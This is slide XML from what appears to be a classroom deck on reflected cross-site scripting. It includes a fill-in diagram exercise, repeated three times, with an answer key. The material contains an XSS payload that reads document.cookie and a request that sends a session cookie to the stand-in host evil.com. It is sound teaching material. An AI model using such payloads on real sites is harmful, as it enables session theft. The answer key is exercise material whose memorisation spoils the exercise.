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51" r:id="rId2"/>
    <p:sldId id="352" r:id="rId3"/>
    <p:sldId id="35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77"/>
    <p:restoredTop sz="77791"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="108" d="100"/>
          <a:sy n="108" d="100"/>
        </p:scale>
        <p:origin x="3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C557B-8980-984A-ADEF-C31BD1797B7D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E1972-C82D-014F-916A-2CDA203F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4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C612-A4EE-D2A2-5EA2-DBDF0E7F2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CB2DF-6C3F-A61B-0B95-352AE3DE4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BF244-5BAF-5851-8A8B-49155F944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REFLECTED XSS DIAGRAM - BOXES TO FILL IN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=========================================</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 1 (Attacker sends link via Gmail to victim):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click this link!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>vulnerable-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>site.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>search?q</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=____</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>*(Leave ____ blank - this is where student fills in the script)*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 2 (HTTP Request from browser to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>facebook.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/vulnerable site):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>search?q</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=____</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>*(Leave ____ blank - student fills in same script as Box 1)*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 3 (HTTP Response back to browser):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Results for: &lt;script&gt;alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>*(You fill this in - shows the reflection)*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 4 (Browser executes script, sends cookies to attacker):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>steal?c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=session_id_12345</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ANSWER KEY:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>===========</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>What the student should write in the blanks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;script&gt;alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>WHAT THIS TESTS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>================</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1. The malicious script goes in the URL parameter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2. The server reflects it unchanged in the response</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>3. The browser executes it and can steal cookies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2F6B1-3BE9-631F-DAF8-D89515FA8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5EAB03-2575-47EE-A113-ECA66D38F3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052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C36BF-C452-A2F5-68CE-F1FAF9D1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156CF-C0C8-D0CB-F77D-46218FDB47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82530-F231-6F32-7F09-BA113E0C2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REFLECTED XSS DIAGRAM - BOXES TO FILL IN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=========================================</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 1 (Attacker sends link via Gmail to victim):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click this link!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>vulnerable-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>site.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>search?q</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=____</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>*(Leave ____ blank - this is where student fills in the script)*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 2 (HTTP Request from browser to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>facebook.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/vulnerable site):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>search?q</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=____</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>*(Leave ____ blank - student fills in same script as Box 1)*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 3 (HTTP Response back to browser):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Results for: &lt;script&gt;alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>*(You fill this in - shows the reflection)*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 4 (Browser executes script, sends cookies to attacker):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>steal?c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=session_id_12345</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ANSWER KEY:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>===========</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>What the student should write in the blanks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;script&gt;alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>WHAT THIS TESTS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>================</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1. The malicious script goes in the URL parameter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2. The server reflects it unchanged in the response</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>3. The browser executes it and can steal cookies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98C8B-E28A-41BB-ADFE-A11202231E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5EAB03-2575-47EE-A113-ECA66D38F3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170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6BF9-A38B-AB46-0EF0-B30273AF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0C08D-CF26-8136-3DEF-EAD66CCB7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4B22C8-866E-8A53-BA09-FF95F2ADF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REFLECTED XSS DIAGRAM - BOXES TO FILL IN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=========================================</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 1 (Attacker sends link via Gmail to victim):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click this link!</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>vulnerable-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>site.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>search?q</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=____</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>*(Leave ____ blank - this is where student fills in the script)*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 2 (HTTP Request from browser to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>facebook.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/vulnerable site):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>search?q</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=____</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>*(Leave ____ blank - student fills in same script as Box 1)*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 3 (HTTP Response back to browser):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Results for: &lt;script&gt;alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>*(You fill this in - shows the reflection)*</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Box 4 (Browser executes script, sends cookies to attacker):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>steal?c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=session_id_12345</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ANSWER KEY:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>===========</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>What the student should write in the blanks:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;script&gt;alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>WHAT THIS TESTS:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>================</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1. The malicious script goes in the URL parameter</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>2. The server reflects it unchanged in the response</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>3. The browser executes it and can steal cookies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6F01F-87B3-EB5A-A82E-5884DC06D4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5EAB03-2575-47EE-A113-ECA66D38F3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4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F296-33B1-9BD4-E619-D24BB44B6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3F3B0-99E8-795C-59FB-23FB8D29B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4EE52-85EB-E241-5971-05C07B27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B63A-FB69-7F84-C522-EDDE5E17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F4F59-F017-1D79-CF76-13063B25F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82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266A-ABFA-91FC-9715-39B7C5E8A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322D4-6B5E-093D-0A19-4B0F172D3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360C4-B3F9-9877-B051-3096FA64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90382-EE2E-34E5-92BF-BB8910F5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B38EA-6869-1892-8643-0A503703A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37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656C-723A-3191-0E14-36637B44D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74627-768B-C62B-A45F-FD8EF11703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FBA56-2EAE-76C6-BC7D-53722B49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36E6C-A541-92A5-D8BB-2EA34D5E4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6BD20-C2B1-1482-BE87-E87633DE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43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1A4BC-E65A-78EF-C60C-10D6B15D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51C0-A1C6-EE4C-0A3B-A8FFEDAB2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D6F45-8941-C904-C57F-F954F702D9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9C175-AD60-6C9A-29C8-BD129B125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D03A9-45D8-311B-EFB2-8BBE6B4C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882A0-4553-059D-C9D1-9A6735C8B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D393-0DC8-DD94-38BF-DFF2588B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A9C7B4-D745-B857-ACC0-9DE23B7A9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4255B-BB73-8DA5-A378-BED3ECF10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1B070-B175-A360-90A5-817E2DE68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CBE54C-0D1F-74F1-C0A3-1CC75F37A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8969E-7B90-3E37-A1E1-A341C936A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DAD73-716C-0DF5-A002-51EBD220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E82528-69C5-A8D8-BF72-F398BA600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3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7CEDD-C34E-722E-C48A-0FCFDFBFE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CCC0F-710E-094E-1A0E-9DDE0A81D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959AB-C652-18B7-DF72-CA20EB993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2928B-ABF4-2250-7CD2-C50EFC915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11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C91812-30E3-139A-A7F8-E738B5D7A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3C86D3-656F-BC65-FD52-8069E6B8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B722E-D977-E7CB-36F4-0C6F4FFDB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91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D1605-CA03-1732-A668-B1D87DE6F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BE72-FF81-287B-86DD-518BF8A0C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8C66C-924F-AE4F-281E-9B8DC322E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BF8FC-48A9-8E75-FF63-6CEBA57D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702D7-DEF8-CF6B-D445-A459BD280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1D1C2-5958-5796-A075-111E20C2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979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DEE1-237F-03AA-1012-E9D76AF0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FDF8A-71D9-A572-4A8E-95E9DA4AB9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BD953-245A-F220-681D-E502611C2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49D3FA-121D-B928-3CA3-FA9AF2E1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673BA-E740-A6FB-19EE-E7AFA164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99DB7-6AF9-623E-2DF4-A744DE3A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5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65FF-ACBC-1928-4489-D45ACE86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2AACD-1B9B-23B9-FDE5-9864BF662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D6E76-11B2-A400-AC87-A0745B24D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DA5E0-25E7-23D1-8077-1E2F81FC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600D5-B8D2-DABC-9669-61C12F65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7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07E6BB-8FEC-F14C-D134-9875EE4D5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A3A5-2298-F36D-12FF-3D9D96D03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ADE8B-ABE2-D71A-06E5-C6AF8F38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C898F-2998-9D10-1875-835BF3FE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D028B-73FC-BCAA-2B9B-B380F1C9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7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28164-9EC8-B54A-38E8-96BA6707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8C22B-BCA9-F089-85BA-7B1C067E1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FCD3B-BBC7-D7B1-1D93-92374E4A67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EF134-38E5-B146-9F88-5E2700D03243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3B2AF-725B-4BFB-600F-461A7DD6F5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7582-3799-1087-76C0-6C1307B41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945FAA-BE29-6F40-92AA-963309722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7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3ACA-12D9-832E-DF58-7EC2B543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32775D-DECD-ACF9-3285-D0D9886E1573}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1520042" y="3334988"/>
            <a:ext cx="7148689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D5748F2-D8B5-84F1-3BD7-8354F991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1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Cross-Site Scripting (XSS) Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 3" descr="C:\Documents and Settings\Eric\Local Settings\Temporary Internet Files\Content.IE5\CV070PCD\MC900435242[1].png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{85F8C705-AABF-9FAC-7AFC-CB8097191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285" y="1678746"/>
            <a:ext cx="503616" cy="9964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Documents and Settings\Eric\Local Settings\Temporary Internet Files\Content.IE5\BHIGFSU1\MC910216349[1].png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E847730C-8987-F544-4AA4-2B0A033EE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10" y="2828195"/>
            <a:ext cx="881979" cy="7471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8D3235-4EEE-98B9-945D-627BB66E6352}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1983179" y="1596002"/>
            <a:ext cx="6667605" cy="46003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36ABBE-9A1A-95A8-BB2C-86BE012D70CB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4038600" y="1219201"/>
            <a:ext cx="2366931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GET / HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Host:  evil.com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B6F6E7-2971-E824-65F7-B322D54AFECD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9190914" y="1257448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evil.com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C09F2D-59D8-0BC7-2FC5-2B2DB77AA06F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2268187" y="2163238"/>
            <a:ext cx="6565219" cy="255454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HTTP/1.1 200 OK</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>&lt;iframe src=https://gmail.com/?user=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&gt;&lt;/iframe&gt;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7DB7DFF-8E23-D76C-F4E3-7672C1084A52}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="1852502" y="5355771"/>
            <a:ext cx="7362750" cy="23918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BF5840-89ED-8883-B7B9-3FDD433B1176}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1520042" y="6400800"/>
            <a:ext cx="7130742" cy="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3DA1A1-B39B-3590-7B1A-E931F17E735C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4307480" y="5788681"/>
            <a:ext cx="4361251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HTTP/1.1 200 OK</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Hello, 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18" name="Picture 3" descr="C:\Documents and Settings\Eric\Local Settings\Temporary Internet Files\Content.IE5\CV070PCD\MC900435242[1].png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{02FCB64A-7D6F-D27D-1B21-293436AB2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652" y="4776366"/>
            <a:ext cx="587706" cy="11628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DA02569-80D4-7DB2-15B9-704B8C832E4B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9067801" y="4355068"/>
            <a:ext cx="1119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gmail.com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4FFC33-AA06-9FF8-BE12-9393F1516395}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4112487" y="4871586"/>
            <a:ext cx="472091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GET /?user=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8676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1153-4AC4-3E2D-6E67-0F24CD45E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8575D0E-2045-367E-5386-9F89A6963513}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1520042" y="3334988"/>
            <a:ext cx="7148689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1B10567-0537-55D6-EA12-1F4D3ADF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1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Cross-Site Scripting (XSS) Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Picture 3" descr="C:\Documents and Settings\Eric\Local Settings\Temporary Internet Files\Content.IE5\CV070PCD\MC900435242[1].png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7EA2DE8B-4198-C201-4609-0CA1BC9249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285" y="1678746"/>
            <a:ext cx="503616" cy="9964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Documents and Settings\Eric\Local Settings\Temporary Internet Files\Content.IE5\BHIGFSU1\MC910216349[1].png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F3E31CFC-2F8F-839A-79BA-E9D8D51A4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10" y="2828195"/>
            <a:ext cx="881979" cy="7471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5F4196B-EFCF-A2F0-9113-D1F10AEE0608}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1983179" y="1596002"/>
            <a:ext cx="6667605" cy="46003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F37CA08-2AB5-5FDB-549D-1C959FDA44DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4038600" y="1219201"/>
            <a:ext cx="2366931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GET / HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Host:  evil.com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A86B57-A677-6A61-A95F-B6F6F9868DE3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9190914" y="1257448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evil.com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DB936-8CE1-BEE2-6430-833D0B914961}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2268187" y="2163238"/>
